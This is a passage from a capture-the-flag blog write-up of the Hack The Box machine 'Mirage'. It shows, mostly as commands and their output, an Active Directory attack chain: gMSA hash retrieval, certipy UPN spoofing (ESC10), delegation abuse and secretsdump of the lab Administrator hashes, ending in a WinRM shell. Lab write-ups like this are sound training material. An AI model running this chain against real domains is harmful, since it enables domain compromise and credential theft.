+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ getTGT.py mirage.htb/<span class="string">&#x27;JAVIER.MMARSHALL&#x27;</span>:<span class="string">&#x27;kujenPassword123&#x27;</span> -dc-ip dc01.mirage.htb</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> JAVIER.MMARSHALL.ccache</span><br><span class="line">                                                                                                        </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=JAVIER.MMARSHALL.ccache </span><br><span class="line">                                                                                                        </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nxc ldap 10.129.104.218 -u JAVIER.MMARSHALL -p kujenPassword123 -k --gmsa</span><br><span class="line">LDAP        10.129.104.218  389    DC01             [*] None (name:DC01) (domain:mirage.htb)</span><br><span class="line">LDAPS       10.129.104.218  636    DC01             [+] mirage.htb\JAVIER.MMARSHALL:kujenPassword123 </span><br><span class="line">LDAPS       10.129.104.218  636    DC01             [*] Getting GMSA Passwords</span><br><span class="line">LDAPS       10.129.104.218  636    DC01             Account: Mirage-Service$      NTLM: 305806d84f7c1be93a07aaf40f0c7866     PrincipalsAllowedToReadPassword: javier.mmarshall </span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PS C:\<span class="built_in">users</span>\mark.bbond\documents&gt; Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;<span class="variable">$_</span>.ObjectDN -match <span class="string">&quot;mark.bbond&quot;</span>&#125;</span><br><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;<span class="variable">$_</span>.ObjectDN -match <span class="string">&quot;mark.bbond&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ObjectDN                : CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb</span><br><span class="line">AceQualifier            : AccessAllowed</span><br><span class="line">ActiveDirectoryRights   : WriteProperty</span><br><span class="line">ObjectAceType           : Public-Information</span><br><span class="line">AceFlags                : None</span><br><span class="line">AceType                 : AccessAllowedObject</span><br><span class="line">InheritanceFlags        : None</span><br><span class="line">SecurityIdentifier      : S-1-5-21-2127163471-3824721834-2568365109-1112</span><br><span class="line">IdentityReferenceName   : Mirage-Service$</span><br><span class="line">IdentityReferenceDomain : mirage.htb</span><br><span class="line">IdentityReferenceDN     : CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb</span><br><span class="line">IdentityReferenceClass  : computer</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ certipy account update \                                                                       </span><br><span class="line">  -user <span class="string">&#x27;mark.bbond&#x27;</span> \</span><br><span class="line">  -upn <span class="string">&#x27;dc01$@mirage.htb&#x27;</span> \</span><br><span class="line">  -u <span class="string">&#x27;mirage-service$@mirage.htb&#x27;</span> \</span><br><span class="line">  -k -no-pass \</span><br><span class="line">  -dc-ip 10.129.104.218 \</span><br><span class="line">  -target dc01.mirage.htb</span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Updating user <span class="string">&#x27;mark.bbond&#x27;</span>:</span><br><span class="line">    userPrincipalName                   : dc01<span class="variable">$@mirage</span>.htb</span><br><span class="line">[*] Successfully updated <span class="string">&#x27;mark.bbond&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We can perform UPN spoofing to request a certificate as dc01</p>
+<p>We have enough permissions to escalate to the administrator account with ESC10. We can learn how to do it by reading the wiki documentation for certipy. Grant resourced based constrained delegation from the domain controller to the group managed service account, then use it to read the hash for the administrator account.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ getTGT.py mirage.htb/<span class="string">&#x27;mark.bbond&#x27;</span>:<span class="string">&#x27;1day@atime&#x27;</span> -dc-ip dc01.mirage.htb            </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> mark.bbond.ccache</span><br><span class="line">                                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=mark.bbond.ccache</span><br><span class="line">                                                                                                                </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ certipy req -u mark.bbond@mirage.htb -no-pass -k -ca mirage-DC01-CA -template User -dc-ip <span class="variable">$IP</span> -dc-host dc01.mirage.htb</span><br><span class="line">                                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ getTGT.py mirage.htb/<span class="string">&#x27;mark.bbond&#x27;</span>:<span class="string">&#x27;1day@atime&#x27;</span> -dc-ip dc01.mirage.htb</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> mark.bbond.ccache</span><br><span class="line">                                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=mark.bbond.ccache</span><br><span class="line">                                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ certipy req -u mark.bbond@mirage.htb -no-pass -k -ca mirage-DC01-CA -template User -dc-ip 10.129.104.218 -dc-host dc01.mirage.htb</span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[!] Target name (-target) not specified and Kerberos authentication is used. This might fail</span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Request ID is 10</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;dc01$@mirage.htb&#x27;</span></span><br><span class="line">[*] Certificate object SID is <span class="string">&#x27;S-1-5-21-2127163471-3824721834-2568365109-1109&#x27;</span></span><br><span class="line">[*] Saving certificate and private key to <span class="string">&#x27;dc01.pfx&#x27;</span></span><br><span class="line">[*] Wrote certificate and private key to <span class="string">&#x27;dc01.pfx&#x27;</span></span><br><span class="line">                                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ getTGT.py MIRAGE.HTB/Mirage-Service$ -hashes :305806d84f7c1be93a07aaf40f0c7866</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> Mirage-Service$.ccache</span><br><span class="line">                                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=Mirage-Service\$.ccache </span><br><span class="line">                                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ certipy-ad account \</span><br><span class="line">  -u <span class="string">&#x27;mirage-service$&#x27;</span> \</span><br><span class="line">  -k -no-pass \</span><br><span class="line">  -target <span class="string">&#x27;dc01.mirage.htb&#x27;</span> \</span><br><span class="line">  -upn <span class="string">&#x27;mark.bbond@mirage.htb&#x27;</span> \</span><br><span class="line">  -user <span class="string">&#x27;mark.bbond&#x27;</span> \</span><br><span class="line">  update</span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[!] DNS resolution failed: The DNS query name does not exist: dc01.mirage.htb.</span><br><span class="line">[!] Use -debug to <span class="built_in">print</span> a stacktrace</span><br><span class="line">[*] Updating user <span class="string">&#x27;mark.bbond&#x27;</span>:</span><br><span class="line">    userPrincipalName                   : mark.bbond@mirage.htb</span><br><span class="line">[*] Successfully updated <span class="string">&#x27;mark.bbond&#x27;</span></span><br><span class="line">                                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ certipy auth -pfx dc01.pfx -dc-ip 10.129.104.218 -ldap-shell</span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Certificate identities:</span><br><span class="line">[*]     SAN UPN: <span class="string">&#x27;dc01$@mirage.htb&#x27;</span></span><br><span class="line">[*]     Security Extension SID: <span class="string">&#x27;S-1-5-21-2127163471-3824721834-2568365109-1109&#x27;</span></span><br><span class="line">[*] Connecting to <span class="string">&#x27;ldaps://10.129.104.218:636&#x27;</span></span><br><span class="line">[*] Authenticated to <span class="string">&#x27;10.129.104.218&#x27;</span> as: <span class="string">&#x27;u:MIRAGE\\DC01$&#x27;</span></span><br><span class="line">Type <span class="built_in">help</span> <span class="keyword">for</span> list of commands</span><br><span class="line"></span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">u:MIRAGE\DC01$</span><br><span class="line"></span><br><span class="line"><span class="comment"># set_rbcd dc01$ Mirage-Service$</span></span><br><span class="line">Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb</span><br><span class="line">Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000</span><br><span class="line"></span><br><span class="line">Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb</span><br><span class="line">Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112</span><br><span class="line">Delegation rights modified successfully!</span><br><span class="line">Mirage-Service$ can now impersonate <span class="built_in">users</span> on dc01$ via S4U2Proxy</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bye!</span></span><br><span class="line"></span><br><span class="line">                                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ impacket-getTGT -dc-ip 10.129.104.218 <span class="string">&quot;mirage.htb/Mirage-Service$&quot;</span> -hashes :305806d84f7c1be93a07aaf40f0c7866</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> Mirage-Service$.ccache</span><br><span class="line">                                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=<span class="string">&#x27;Mirage-Service$.ccache&#x27;</span></span><br><span class="line">                                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ impacket-getST -spn <span class="string">&#x27;cifs/dc01.mirage.htb&#x27;</span> -impersonate <span class="string">&#x27;dc01$&#x27;</span> -dc-ip 10.129.104.218  <span class="string">&#x27;mirage.htb/Mirage-Service$&#x27;</span> -k -no-pass</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Impersonating dc01$</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> dc01<span class="variable">$@cifs_dc01</span>.mirage.htb@MIRAGE.HTB.ccache</span><br><span class="line">                                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=dc01<span class="variable">$@cifs_dc01</span>.mirage.htb@MIRAGE.HTB.ccache</span><br><span class="line">                                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=dc01\<span class="variable">$@cifs_dc01</span>.mirage.htb@MIRAGE.HTB.ccache </span><br><span class="line">                                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ impacket-secretsdump <span class="string">&#x27;dc01$&#x27;</span>@dc01.mirage.htb -k -no-pass -dc-ip 10.129.104.218 -just-dc-user administrator</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7</span><br><span class="line">mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07</span><br><span class="line">mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure></div>
+
+<p>And finally claim my root flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ impacket-getTGT -dc-ip 10.129.104.218 <span class="string">&quot;mirage.htb/Administrator&quot;</span> -hashes :7be6d4f3c2b9c0e3560f5a29eeb1afb3</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> Administrator.ccache</span><br><span class="line">                                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=Administrator.ccache </span><br><span class="line">                                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ evil-winrm -i dc01.mirage.htb -r mirage.htb</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                                                     </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion                                                                                       </span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cat</span> ../desktop/root.txt</span><br><span class="line">ae9c51e9d9569cef82df05dce7bb7c80</span><br></pre></td></tr></table></figure></div>
+
+
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Mirage</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-11-22 20:59:41</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-11-22 21:03:46
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/11/22/Hackthebox-Mirage/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/11/21/International-Cybersecurity-Challenge-ICC-Tokyo-Japan/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">International Cybersecurity Challenge (ICC) - Tokyo, Japan</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Mirage</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
